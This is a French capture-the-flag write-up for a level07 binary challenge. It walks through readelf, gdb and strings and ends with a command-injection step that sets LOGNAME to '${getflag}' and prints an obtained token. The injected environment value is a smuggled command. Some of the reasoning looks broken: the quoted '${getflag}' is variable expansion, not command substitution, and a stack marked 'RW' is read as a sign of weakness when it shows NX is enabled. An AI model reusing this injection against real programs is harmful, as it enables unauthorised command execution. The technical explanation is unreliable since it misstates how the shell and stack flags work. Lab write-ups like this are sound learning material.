# Level07

Commençons par vérifier si nous pouvons examiner le programme level07 en utilisant readelf :
```bash
readelf -l level07
```

Nous cherchons une section intéressante dans la sortie de la commande, qui devrait ressembler à ceci :
```bash
GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
```

La partie importante est "RW," qui signifie que cette section est à la fois en lecture (R) et en écriture (W). Cela nous donne un indice que le programme pourrait être vulnérable à une attaque.

Maintenant, utilisons le débogueur GDB pour inspecter le programme

utilisation de gdb
```bash
gdb ./level07
layout next
b main
run 
next
```

Nous mettons un point d'arrêt sur la fonction main pour examiner plus en détail le programme. En utilisant next, nous pouvons avancer dans le programme étape par étape.

Ensuite, nous utilisons la commande strings pour inspecter les chaînes présentes dans le programme level07. Nous recherchons une chaîne intéressante, et nous trouvons "LOGNAME."
```bash
strings level07
```

Maintenant, nous pouvons exploiter le programme en modifiant la variable d'environnement LOGNAME. Nous la définissons sur "${getflag}" pour exécuter la commande getflag :

```bash
export LOGNAME='${getflag}'
./level07
```

Le programme level07 s'exécute avec la variable d'environnement modifiée et renvoie le jeton du niveau suivant :
```bash
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
Ainsi, nous avons réussi à obtenir le jeton en exploitant une vulnérabilité dans le programme qui nous permet de modifier la variable d'environnement LOGNAME.
